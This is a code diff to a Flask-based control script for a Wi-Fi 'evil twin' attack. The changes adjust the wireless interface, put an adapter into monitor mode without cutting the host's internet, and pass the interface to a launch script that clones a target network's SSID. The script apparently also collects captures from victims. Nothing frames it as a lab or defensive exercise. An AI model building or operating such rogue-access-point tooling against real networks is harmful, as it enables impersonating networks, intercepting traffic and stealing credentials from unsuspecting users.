@@ -26,7 +26,7 @@ from flask import Flask, request, Response
 HERE = os.path.dirname(os.path.abspath(__file__))
 ROOT = os.path.dirname(HERE)                       # repo root (scripts live here)
 PORT = int(os.environ.get("OPS_PORT", "8080"))
-IFACE = os.environ.get("OPS_IFACE", "wlan0mon")
+IFACE = os.environ.get("OPS_IFACE", "wlan1")     # AR9271 (ath9k_htc); NOT wlan0 (Intel net card)
 SCAN_SECS = int(os.environ.get("OPS_SCAN_SECS", "8"))
 LOG_DIR = "/tmp/evil-twin-logs"
 CAPTURES = os.path.join(HERE, "captures.jsonl")
@@ -112,9 +112,12 @@ def _int(s):
 def real_scan():
     with _lock:
         TARGETS.clear()
-    log("enabling monitor + scanning the air…")
-    subprocess.call(["bash", "-c", "airmon-ng check kill >/dev/null 2>&1 || true"])
-    subprocess.call(["bash", "-c", f"airmon-ng start wlan0 >/dev/null 2>&1 || true"])
+    log(f"enabling monitor on {IFACE} + scanning the air…")
+    # NM-safe: release only this adapter, so wlan0's internet stays up (no check kill).
+    subprocess.call(["bash", "-c", f"nmcli device set {IFACE} managed no >/dev/null 2>&1 || true"])
+    subprocess.call(["bash", "-c",
+                     f"ip link set {IFACE} down; iw dev {IFACE} set type monitor; "
+                     f"ip link set {IFACE} up"])
     os.makedirs(LOG_DIR, exist_ok=True)
     prefix = os.path.join(LOG_DIR, "ops-scan")
     for old in glob.glob(prefix + "*"):
@@ -138,7 +141,7 @@ def real_launch():
     ssid, ch = TARGET.get("ssid"), TARGET.get("channel")
     log(f"launching evil twin of \"{ssid}\" on channel {ch}…")
     run_bg(["bash", os.path.join(ROOT, "start-evil-twin.sh")], "attack",
-           env={"ET_SSID": ssid, "ET_CHANNEL": str(ch)})
+           env={"ET_SSID": ssid, "ET_CHANNEL": str(ch), "ET_IFACE": IFACE})
 
 
 def real_stop():
